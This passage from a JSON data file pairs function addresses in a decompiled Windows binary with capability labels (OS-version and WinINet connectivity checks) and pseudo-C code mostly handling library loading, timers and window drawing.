        "decompiled_code": "\nuint fcn.004285c8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x4963ac != 0) {\n        uVar1 = fcn.0042074c();\n        fcn.0042074c(uVar1);\n        iVar2 = fcn.00428394();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 92
    },
    "00428840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00428840(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x42884d;\n    fcn.00428830();\n    uStack12 = 0x4289f7;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x496474) {\n        *0x496474 = *0x496474 + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x496470 != 0) && (puStack8 = &stack0xfffffffc,  *0x496474 == 0)) {\n        iStack20 = *0x496470;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x496470 = 0;\n        *0x4963b0 = 0;\n        *0x4963b4 = 0;\n        *0x4963b8 = 0;\n        *0x4963bc = 0;\n        *0x4963c0 = 0;\n        *0x4963c4 = 0;\n        *0x4963c8 = 0;\n        *0x4963cc = 0;\n        *0x4963d0 = 0;\n        *0x4963d4 = 0;\n        *0x4963d8 = 0;\n        *0x4963dc = 0;\n        *0x4963e0 = 0;\n        *0x4963e4 = 0;\n        *0x4963e8 = 0;\n        *0x4963ec = 0;\n        *0x4963f0 = 0;\n        *0x4963f4 = 0;\n        *0x4963f8 = 0;\n        *0x4963fc = 0;\n        *0x496400 = 0;\n        *0x496404 = 0;\n        *0x496408 = 0;\n        *0x49640c = 0;\n        *0x496410 = 0;\n        *0x496414 = 0;\n        *0x496418 = 0;\n        *0x49641c = 0;\n        *0x496420 = 0;\n        *0x496424 = 0;\n        *0x496428 = 0;\n        *0x49642c = 0;\n        *0x496430 = 0;\n        *0x496434 = 0;\n        *0x496438 = 0;\n        *0x49643c = 0;\n        *0x496440 = 0;\n        *0x496444 = 0;\n        *0x496448 = 0;\n        *0x49644c = 0;\n        *0x496450 = 0;\n        *0x496454 = 0;\n        *0x496458 = 0;\n        *0x49645c = 0;\n        *0x496460 = 0;\n        *0x496464 = 0;\n        *0x496468 = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x4289fe;\n    iStack16 = 0x4289f6;\n    fcn.00428838();\n    return;\n}\n",
        "token_count": 783
    },
    "00428a00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00428a00(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x428a14;\n    fcn.00428830();\n    uStack20 = 0x428db3;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x496474 = *0x496474 + 1;\n    puStack16 = &fcn.00428a00::var_1h + 1;\n    if (*0x496470 == 0) {\n        puStack16 = &fcn.00428a00::var_1h + 1;\n        *0x496470 = sub.kernel32.dll_LoadLibraryA(0x428dc4);\n        if (*0x496470 != 0) {\n            *0x4963b0 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428dd0);\n            *0x4963b4 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428de0);\n            *0x4963b8 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428df0);\n            *0x4963bc = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e04);\n            *0x4963c0 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e14);\n            *0x4963c4 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e14);\n            *0x4963c8 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e34);\n            *0x4963cc = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e48);\n            *0x4963d0 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e5c);\n            *0x4963d4 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e70);\n            *0x4963d8 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428e8c);\n            *0x4963dc = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428ea4);\n            *0x4963e0 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428eb4);\n            *0x4963e4 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428ec4);\n            *0x4963e8 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428ed8);\n            *0x4963ec = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f00);\n            *0x4963f0 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f10);\n            *0x4963f4 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f20);\n            *0x4963f8 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f30);\n            *0x4963fc = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f40);\n            *0x496400 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f4c);\n            *0x496404 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f60);\n            *0x496408 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f74);\n            *0x49640c = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f84);\n            *0x496410 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428f94);\n            *0x496414 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428fa4);\n            *0x496418 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428fb4);\n            *0x49641c = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428fcc);\n            *0x496420 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428fdc);\n            *0x496424 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x428ff0);\n            *0x496428 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429004);\n            *0x49642c = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x42901c);\n            *0x496430 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x42902c);\n            *0x496434 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x42903c);\n            *0x496438 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x42904c);\n            *0x49643c = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429060);\n            *0x496440 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429070);\n            *0x496444 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429080);\n            *0x496448 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x42908c);\n            *0x49644c = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x42909c);\n            *0x496450 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x4290b8);\n            *0x496454 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x4290d4);\n            *0x496458 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x4290ec);\n            *0x49645c = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429104);\n            *0x496460 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429118);\n            *0x496464 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429138);\n            in_stack_fffffe6c = *0x496470;\n            *0x496468 = sub.kernel32.dll_GetProcAddress_1(*0x496470, 0x429154);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.00428838(0x428dba);\n    return;\n}\n",
        "token_count": 1638
    },
    "00429164": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00429164(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x496470 != 0) && (iVar1 = (**0x496444)(),  iVar1 != 0)) && (iVar1 = (**0x496440)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 83
    },
    "0042918c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042918c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4291d4;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49646c = *0x49646c + 1;\n    if (*0x49646c == 0) {\n        while (0 < *0x496474) {\n            fcn.00428840();\n        }\n        fcn.00403f58();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 162
    },
    "0042d738": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d738(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x42d7c5;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (in_EAX[0x66] != 0) {\n        cVar2 = (**(*in_EAX + 0x50))();\n        if ((cVar2 != '\\0') && (*(in_EAX + 0x68) != '\\0')) {\n            fcn.004455ac();\n            cVar2 = fcn.00458370();\n            if (cVar2 != '\\0') {\n                piVar1 = in_EAX[0x66];\n                cVar2 = fcn.00404154();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xd4))();\n                    *(param_2 + 0xc) = 1;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x42d7cc;\n    uStack28 = 0x42d7c4;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 341
    },
    "0042e25c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042e25c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004483a4();\n    if ((*(*0x492d08 + 0xc) != '\\0') && (**0x492cfc == 2)) {\n        *(in_EAX + 0x1b8) = 0;\n    }\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 185
    },
    "0042eb30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042eb30(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(*(arg_8h + -4) + 0x30) != 0) && (iVar2 = fcn.00449558(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0044951c();\n            if ((piVar3 != *(arg_8h + -4)) && (cVar1 = fcn.004040e4(),  cVar1 != '\\0')) {\n                iVar4 = (**(*piVar3 + 0x3c))();\n                if (iVar4 != 0) {\n                    (**(*piVar3 + 0x3c))();\n                    cVar1 = fcn.004040e4();\n                    if ((cVar1 != '\\0') && (iVar4 = (**(*piVar3 + 0x3c))(),  *(iVar4 + 0x95) != '\\0')) {\n                        (**(*piVar3 + 0x3c))();\n                        fcn.004558e4();\n                    }\n                }\n                (**(*piVar3 + 0xdc))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "0042ebec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ebec(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *var_4h;\n    \n    if (param_2 != *(in_EAX + 0x259)) {\n        *(in_EAX + 0x259) = param_2;\n        fcn.0044d498();\n        cVar1 = fcn.0044d568();\n        var_4h = in_EAX;\n        if (cVar1 != '\\0') {\n            uVar2 = (**(*in_EAX + 0xd8))(0);\n            var_4h = uVar2 & 0x7f;\n            uVar3 = fcn.0044d1c8(0xf1);\n            sub.user32.dll_SendMessageA(uVar3);\n        }\n        if (param_2 != '\\0') {\n            fcn.0042eb30(&stack0xfffffffc);\n            fcn.004451a4();\n            if (*(var_4h + 0x94) == '\\0') {\n                fcn.00404154();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "0042efa4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0042efa4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.00445c74();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x250) != '\\x01')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 80
    },
    "00433b98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00433b98(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0044e820();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x433c2c;\n    iVar1 = fcn.00423da4();\n    *(in_EAX + 0x198) = iVar1;\n    *(iVar1 + 0x14) = in_EAX;\n    *(iVar1 + 0x10) = fcn.00433fe4;\n    *(iVar1 + 0x24) = in_EAX;\n    uVar2 = fcn.0040416c();\n    *(iVar1 + 0x20) = uVar2;\n    fcn.00444ca0();\n    fcn.00444c6c();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 325
    },
    "00433c80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433c80(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    double dVar7;\n    \n    iVar1 = fcn.00424424();\n    iVar2 = fcn.0042443c();\n    iVar3 = fcn.00444f18();\n    iVar4 = fcn.00444f5c();\n    if ((((*(in_EAX + 0x1a8) != '\\0') ||\n         ((iVar6 = iVar1,  iVar5 = iVar2,  *(in_EAX + 0x1ad) != '\\0' && ((iVar3 < iVar1 || (iVar4 < iVar2)))))) &&\n        (iVar6 = iVar3,  iVar5 = iVar4,  *(in_EAX + 0x1ad) != '\\0')) && ((0 < iVar1 && (0 < iVar2)))) {\n        dVar7 = iVar1 / iVar2;\n        if (iVar2 < iVar1) {\n            iVar5 = fcn.00403160(iVar3, iVar4, dVar7);\n            if (iVar4 < iVar5) {\n                iVar1 = iVar4;\n                iVar6 = fcn.00403160(iVar3, iVar4, dVar7);\n                iVar5 = iVar4;\n                iVar4 = iVar1;\n            }\n        }\n        else {\n            iVar6 = fcn.00403160(iVar3, iVar4, dVar7);\n            if (iVar3 < iVar6) {\n                iVar1 = iVar3;\n                iVar5 = fcn.00403160(iVar3, iVar4, dVar7);\n                iVar6 = iVar3;\n                iVar3 = iVar1;\n            }\n        }\n    }\n    *param_2 = 0;\n    param_2[1] = 0;\n    param_2[2] = iVar6;\n    param_2[3] = iVar5;\n    if (*(in_EAX + 0x1a9) != '\\0') {\n        iVar1 = iVar4 - iVar5 >> 1;\n        if (iVar1 < 0) {\n            iVar1 = iVar1 + ((iVar4 - iVar5 & 1U) != 0);\n        }\n        iVar4 = iVar3 - iVar6 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((iVar3 - iVar6 & 1U) != 0);\n        }\n        sub.user32.dll_OffsetRect(param_2, iVar4, iVar1);\n    }\n    return;\n}\n",
        "token_count": 599
    },
    "00433e6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00433e6c(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    piVar1 = *(*(in_EAX + 0x198) + 0xc);\n    if ((((*(in_EAX + 0x57) != '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) && (piVar1 != NULL)) &&\n       (*(piVar1 + 0x22) != '\\0')) {\n        iVar3 = (**(*piVar1 + 0x24))();\n        if (iVar3 == 0) {\n            *(piVar1 + 0x22) = 0;\n        }\n        else {\n            iVar3 = fcn.00458424();\n            if ((iVar3 != 0) && (*(iVar3 + 0x276) != '\\0')) {\n                cVar2 = fcn.0044d568();\n                if (cVar2 != '\\0') {\n                    if (*(in_EAX + 0x1ac) == '\\0') {\n                        uVar4 = fcn.0044d1c8(0x30f, 0, 0);\n                        sub.user32.dll_PostMessageA(uVar4);\n                    }\n                    else {\n                        fcn.00446870(0);\n                    }\n                    uVar4 = 1;\n                    *(piVar1 + 0x22) = 0;\n                }\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 358
    },
    "00433f08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00433f08(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint var_1h;\n    \n    if ((*(in_EAX + 0x1aa) & arg_10h) != 0) {\n        cVar1 = fcn.00433e6c();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x90))();\n        }\n        else {\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    if (*(in_EAX + 0x1a2) != 0) {\n        (*in_EAX[0x68])(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00433fe4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00433fe4(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    if (*(in_EAX + 0x17) != '\\0') {\n        iVar3 = fcn.00424424();\n        if (0 < iVar3) {\n            iVar3 = fcn.0042443c();\n            if (0 < iVar3) {\n                uVar4 = fcn.00424424();\n                uVar4 = fcn.0042443c(uVar4);\n                (**(*in_EAX + 0x88))(uVar4);\n            }\n        }\n    }\n    piVar1 = *(in_EAX[0x66] + 0xc);\n    if (piVar1 == NULL) {\n        in_EAX[0x14] = ~*0x43410c & in_EAX[0x14];\n    }\n    else {\n        cVar2 = fcn.004040e4();\n        if (cVar2 == '\\0') {\n            cVar2 = fcn.004040e4();\n            if (cVar2 == '\\0') {\n                (**(*piVar1 + 0x3c))();\n            }\n        }\n        fcn.00433c80();\n        cVar2 = (**(*piVar1 + 0x28))();\n        if ((((cVar2 == '\\0') && (iStack24 < 1)) && (iStack20 < 1)) &&\n           ((in_EAX[0x12] <= iStack16 && (in_EAX[0x13] <= iStack12)))) {\n            in_EAX[0x14] = *0x43410c | in_EAX[0x14];\n        }\n        else {\n            in_EAX[0x14] = ~*0x43410c & in_EAX[0x14];\n        }\n        cVar2 = fcn.00433e6c();\n        if ((cVar2 != '\\0') && (*(in_EAX + 0x6b) != '\\0')) {\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    if (*(in_EAX + 0x6b) == '\\0') {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "00434354": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00434354(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint nBottomRect;\n    uint *puVar2;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x1c) & 0x10) != 0) {\n        if (*(in_EAX + 0x199) == '\\x06') {\n            fcn.004212d0();\n            fcn.004212b4();\n            fcn.004211f4();\n            fcn.004215f0();\n            uVar1 = fcn.00444f18();\n            nBottomRect = fcn.00444f5c();\n            fcn.004219f4(nBottomRect, uVar1);\n            return;\n        }\n        fcn.004212d0();\n        fcn.004212b4();\n        fcn.004211f4();\n        fcn.004215f0();\n    }\n    fcn.00421300();\n    if (*(var_4h + 0x198) == '\\0') {\n        var_8h = 0xff000010;\n        var_ch = 0xff000014;\n    }\n    else {\n        var_8h = 0xff000014;\n        var_ch = 0xff000010;\n    }\n    uVar1 = var_8h;\n    if (*(var_4h + 0x199) < 6) {\n    // switch table (6 cases) at 0x434446\n        switch(*(*(var_4h + 0x199) * 4 + 0x434446)) {\n        case 0x43445e:\n            puVar2 = &var_1ch;\n            fcn.00413a94(puVar2, *(var_4h + 0x4c) + -1);\n            fcn.00434224(puVar2);\n            break;\n        case 0x434489:\n            var_8h = var_ch;\n            puVar2 = &var_1ch;\n            fcn.00413a94(puVar2, *(var_4h + 0x4c) + -1);\n            fcn.00434224(puVar2);\n            var_ch = uVar1;\n            puVar2 = &var_1ch;\n            var_8h = uVar1;\n            fcn.00413a94(puVar2, *(var_4h + 0x4c) + -2);\n            fcn.00434224(puVar2);\n            break;\n        case 0x4344f3:\n            fcn.00434314(0, *(var_4h + 0x48), &stack0xfffffffc);\n            fcn.00434314(1, *(var_4h + 0x48), &stack0xfffffffc);\n            break;\n        case 0x434529:\n            fcn.00434314(*(var_4h + 0x4c) + -2, *(var_4h + 0x48), &stack0xfffffffc);\n            fcn.00434314(*(var_4h + 0x4c) + -1, *(var_4h + 0x48), &stack0xfffffffc);\n            break;\n        case 0x434567:\n            fcn.00434314(*(var_4h + 0x4c), 0, &stack0xfffffffc);\n            fcn.00434314(*(var_4h + 0x4c), 1, &stack0xfffffffc);\n            break;\n        case 0x43459a:\n            fcn.00434314(*(var_4h + 0x4c), *(var_4h + 0x48) + -2, &stack0xfffffffc);\n            fcn.00434314(*(var_4h + 0x4c), *(var_4h + 0x48) + -1, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 915
    },
    "004346d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004346d8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x434757;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.00406a50();\n            fcn.0040c5ac();\n            fcn.004047cc();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00404da0(0x43475e);\n    return;\n}\n",
        "token_count": 303
    },
    "00434940": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434940(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x434a33;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    if (*(in_EAX + 0x265) == '\\0') {\n        fcn.004455ac();\n        iVar2 = in_EAX[0x98];\n        if (*(in_EAX + 0x259) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x97];\n        }\n        if (*(in_EAX + 0x25a) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x97];\n        }\n        if (0 < iVar2) {\n            var_8h = in_EAX[0x12];\n            var_4h = in_EAX[0x13];\n            if (*(*(param_2 + 8) + 0x10) != var_8h) {\n                var_ch = 0;\n                var_10h = (var_8h - iVar2) + -1;\n                uStack60 = fcn.0044d1c8(&var_10h, 0xffffffff);\n                sub.user32.dll_InvalidateRect();\n            }\n            if (*(*(param_2 + 8) + 0x14) != var_4h) {\n                var_10h = 0;\n                var_ch = (var_4h - iVar2) + -1;\n                uVar1 = fcn.0044d1c8(&var_10h, 0xffffffff);\n                sub.user32.dll_InvalidateRect(uVar1);\n            }\n        }\n    }\n    else {\n        uStack44 = 0x434a33;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0x80))();\n    }\n    fcn.0044b504();\n    *in_FS_OFFSET = uStack60;\n    fcn.00404da0(0x434a3a);\n    return;\n}\n",
        "token_count": 563
    },
    "00434a44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
